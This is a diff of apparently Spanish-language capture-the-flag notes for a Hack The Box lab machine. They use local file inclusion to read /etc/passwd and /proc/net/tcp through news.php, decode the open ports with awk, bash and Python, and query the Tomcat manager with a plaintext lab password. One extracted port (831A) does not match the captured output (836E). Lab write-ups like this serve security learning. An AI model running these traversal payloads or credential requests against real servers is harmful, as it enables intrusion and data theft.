@@ -32,8 +32,73 @@ megahosting.htb:8080
 [+]LFI[+]
 http://megahosting.htb/news.php?file=statement
 http://megahosting.htb/news.php?file=../../../../etc/passwd
-
 ash:x:1000:1000:clive:/home/ash:/bin/bash
+
+http://megahosting.htb/news.php?file=../../../../proc/net/tcp >> Open Ports Inside Machine.
+
+
+[+]AWK
+❯ curl -s -X GET http://megahosting.htb/news.php\?file\=../../../../proc/net/tcp
+  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode                                                     
+   0: 00000000:1F90 00000000:0000 0A 00000000:00000000 00:00000000 00000000   997        0 25266 1 0000000000000000 100 0 0 10 0                     
+   1: 00000000:0050 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 24888 1 0000000000000000 100 0 0 10 0                     
+   2: 3500007F:0035 00000000:0000 0A 00000000:00000000 00:00000000 00000000   101        0 22464 1 0000000000000000 100 0 0 10 0                     
+   3: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 24309 1 0000000000000000 100 0 0 10 0                     
+   4: C20A0A0A:0050 270E0A0A:D0F2 01 00000000:00000000 02:000AFC80 00000000    33        0 29537 2 0000000000000000 1057 4 30 10 -1                  
+   5: C20A0A0A:836E 01010101:0035 02 00000001:00000000 01:0000030A 00000003   101        0 30399 2 0000000000000000 800 0 0 1 7
+
+
+Sabemos que los puertos estan en hexadecimal y son por ej: 1F90, 0050, 0035, 0016, 836E.
+Mas adelante con python podemos descrifar los valores hexadecimales.
+Con awk filtramos la data que nos interesa para trabajar mas claro y comodo.
+
+❯ curl -s -X GET http://megahosting.htb/news.php\?file\=../../../../proc/net/tcp > OpenPorts
+
+❯ bat OpenPorts | awk '{print $2}' > OpenPortsV2
+❯ bat OpenPortsV2| awk '{print $2}' FS=":" > OpenPortsV3
+❯ bat OpenPortsV3 | sort -u > HexaPorts
+
+
+[+]BASH SCRIPTING
+❯ bat HexaPorts | while read line; do echo "[+]Port $line Open[+]"; done
+❯ while read line; do echo "[+]Port $line Open[+]"; done < HexaPorts
+
+[+]Port 0016 Open[+]
+[+]Port 0035 Open[+]
+[+]Port 0050 Open[+]
+[+]Port 1F90 Open[+]
+[+]Port 831A Open[+]
+
+- while read line = Lectura de archivo línea por línea.
+- $line = Es el valor de cada linea durante la iteraccion del bucle while.
+
+
+[+]PYTHON (convert hexadecimal)
+❯ bat HexaPorts
+───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: HexaPorts
+───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ 0016
+   2   │ 0035
+   3   │ 0050
+   4   │ 1F90
+   5   │ 831A
+───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+❯ python3
+Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
+[GCC 10.2.1 20210110] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> 0x0016
+22
+>>> 0x0035
+53
+>>> 0x0050
+80
+>>> 0x1F90
+8080
+>>> 0x831A
+33562
+
 
 [+]TOMCAT[+] P:8080
 Users are defined in /etc/tomcat9/tomcat-users.xml.
@@ -49,4 +114,4 @@ FAIL - Unknown command [/text]
 https://tomcat.apache.org/tomcat-8.5-doc/host-manager-howto.html
 ❯ curl -u tomcat:$3cureP4s5w0rd123! http://10.10.10.194:8080/manager/text/list
 
-
+BUG FOREVER
